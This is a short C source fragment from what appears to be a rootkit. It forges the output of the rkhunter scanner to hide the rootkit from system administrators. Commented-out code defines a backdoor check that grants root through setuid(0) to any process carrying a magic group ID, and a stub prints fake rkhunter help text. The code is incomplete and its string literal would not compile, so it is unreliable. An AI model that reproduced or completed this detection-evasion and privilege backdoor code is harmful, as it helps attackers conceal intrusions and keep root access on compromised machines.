#include <stdio.h> 
#include <time.h> 
#include "../rkconst.h"
/* ---------- RKHUNTER FORGERY ---------- */
/* I'm taking it one step further. Instead
 * of hiding this rootkit's existence to 
 * rkhunter, I'm going to give the user 
 * faked output so they think they're 
 * running it instead. */ 

void fake(int argc, char **argv[]); 	
int owned(void);
/*
int owned(void)
{ 
	int x; 
	if ((getuid() == 0) || getgid() == MAGICGID)
	{ 
		setuid(0); 
		x = 1; 
	} 
	else
		x = 0; 
	return x; 
}

void fake(int argc, char **argv[])
{
	if (argc == 1 || !strcmp(argv[1], "--help")) 
	{ 
		printf("\nUsage: rkhunter {--check | --unlock | --update | --versioncheck |
                 --propupd [{filename | directory | package name},...] |
                 --list [{tests | {lang | languages} | rootkits | perl | propfiles}] |
                 --config-check | --version | --help} [options]\n");
	}
}*/
